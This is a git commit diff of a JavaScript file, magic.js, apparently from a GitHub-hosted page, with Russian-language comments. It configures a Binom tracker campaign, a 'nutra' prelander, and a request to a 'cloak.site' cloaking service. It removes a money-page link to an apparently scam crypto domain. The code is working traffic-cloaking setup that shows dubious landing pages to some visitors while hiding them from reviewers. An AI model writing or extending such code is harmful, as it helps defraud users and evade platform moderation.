88194823609b17558c7b14e32ad1bf858b1d10f0
Denis8854 <37094139+Denis8854@users.noreply.github.com>
2020-02-18 14:09:42 +0200

    Update magic.js

--- magic.js
+++ magic.js
@@ -1,12 +1,9 @@
-var binomCampaingKey = 's15yun0z67b7t9btickt'; /* Key кампании в Binom. Не ID! Узнать key нужной кампании можно в настройках этой кампании. Вот здесь - http://prntscr.com/qua54o  */
-var gitHubId = 'denis8854'; /*ID данного GitHub сайта. Только ID, не вся ссылка!*/
+var binomCampaingKey = 'qlxngowo6oug92mcczum'; /* GLOBAL GitHub Nutra, id:172. Key кампании в Binom. Не ID! Узнать key нужной кампании можно в настройках этой кампании. Вот здесь - http://prntscr.com/qua54o  */
 var landingUrl = 'https://serd.site/landing/nutra/v5/'; /*Адрес преленда, который необходимо подгрузить*/
-var moneyPageUrl = 'https://cl.bitcoincircuit.online'; /*Адрес манипейдж, который будет подставлен в ссылки на преленде*/
-var landignLoadingCampaingId = '2dpmfzy61v5pcfgkk3ew'; /*Key кампании в Binom, в которой будут отображатся логи при загрузке преленда девайсом юзера. Служит для отслеживания потери трафика. По умолчанию стоит стандартная кампания GLOBAL Landing Loading, id:167*/
 
 /* БОЛЬШЕ НИЧЕГО НЕ МЕНЯТЬ!*/
 
-var landing = landingUrl + '?mpurl=' + moneyPageUrl + '&githubid=' + gitHubId + '&landingloadingid=' + landignLoadingCampaingId; 
+var landing = landingUrl; 
 
 var url = 'https://cloak.site/binom/?bckey='+binomCampaingKey;
 var xhr = new XMLHttpRequest();
